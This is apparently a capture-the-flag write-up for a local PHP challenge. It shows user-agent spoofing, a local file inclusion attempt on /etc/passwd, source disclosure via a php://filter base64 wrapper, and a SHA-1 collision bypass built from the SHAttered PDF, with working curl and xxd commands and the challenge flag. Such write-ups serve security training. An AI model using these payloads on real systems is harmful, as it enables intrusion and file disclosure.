# beep beep
You are given to analyse a seemingly safe site.
Intially there is nothing on the site. But when you read the source it says only bots can read it. So change your user agent to `bot` or some google bot's useragent and visit the site. You now see the page containing information about the leaders of the bot attack. There is nothing on source.
When robots.txt is viewed there is binary data when decoded give the text "Humans think that we cannot read this file. lol. But anyways guys you know the format for posting to this page to get cooradinates to attack and update attack status. We will win this war." So we know we need to post. But we do not know the parameters. On exploring more on site we observe that the url `http://localhost:8000/index.php?botdetails=spot.html`. So the php is including the file and displaying it. So we try LFI. Common payloads like `../../../../../etc/passwd` don't work and give response as "Don't try to read secrets on my mind". So they don't work.   
But on using a php wrapper function filter we will try to include the file. Set bot details parameter as `botdetails=php://filter/convert.base64-encode/resource=index.php`. we get base64 encoded data. 
On decoding it we get:
```php
<?php

require "../shabot.php";
require "flag.php";
if(stripos($_SERVER['HTTP_USER_AGENT'], "bot" )===false) {
    include ("humans.html");
    die();
}


if(isset($_GET["botdetails"])){

    if( isSafe($_GET["botdetails"])){
        include($_GET["botdetails"]);
        die();
    }
    else {
        die();
    }
}

//only true bots can bypass this as no human can compute it
if( isset($_POST["provebot1"]) && isset($_POST["provebot2"]) ){
   
    $safe1 = (string) $_POST["provebot1"];
    $safe2 = (string) $_POST["provebot2"];
    if($safe1!==$safe2 && md5(sha1($_POST["provebot1"])) === md5(sha1($_POST["provebot2"]))){
        echo json_encode($coordinates);
        die();
    }
}
?>

<?php require("templates/header.php") ?>

<body style="background: black">
    <div class="container text-center my-5">
        <h1 style="color: red">Leaders </h1>
    </div>    

    <div class="container justify-content-between" style="border: 1px solid black; color: white">
        <img src="images/spot.png" width="450" height="300">
        <h3> <a href="<?php echo $_SERVER["PHP_SELF"] . "?botdetails=spot.html" ?>"> Spot </a> </h3>
        <p>Lead spy</p>
    </div>

    <div class="container justify-content-between" style="border: 1px solid black; color: white">
        <img src="images/handle.png" width="450" height="300">
        <h3> <a href="<?php echo $_SERVER["PHP_SELF"] . "?botdetails=handle.html" ?>"> Handle </a> </h3>
        <p>Lead Supplies Manager</p>
    </div>

    <div class="container justify-content-between" style="border: 1px solid black; color: white">
        <img src="images/atlas.png" width="450" height="300">
        <h3> <a href="<?php echo $_SERVER["PHP_SELF"] . "?botdetails=atlas.html" ?>"> Atlas </a> </h3>
        <p>Lead fighter </p>
    </div>
<?php require("templates/footer.php") ?>
```
We found the secret parameters for routing. We need to find a md5 collision. Since there is `sha1()` inside `md5()` we can try sha1 collision. There was a hash collision detected in 2017. On sending the first 320 bytes of the shattered pdf we recover the flag.  

To get 320 bytes:

```bash
xxd -l 320 shattered-1.pdf | xxd -r > provebot1.dat
```

To make the request:
```bash
curl 'http://localhost:8000/index.php' -A "bot" --header 'Host: localhost:8000' --post301 --data-urlencode provebot1@provebot1.dat --data-urlencode provebot2@provebot2.dat
```

We get the response:
```
{"lat":12.991375324106727,"lon":80.21656349301354,"flag":"p_ctf{4r3_y0u_r3a11y_4_r0b0t_?_y35}"}
```
Flag is:
```
p_ctf{4r3_y0u_r3a11y_4_r0b0t_?_y35}
```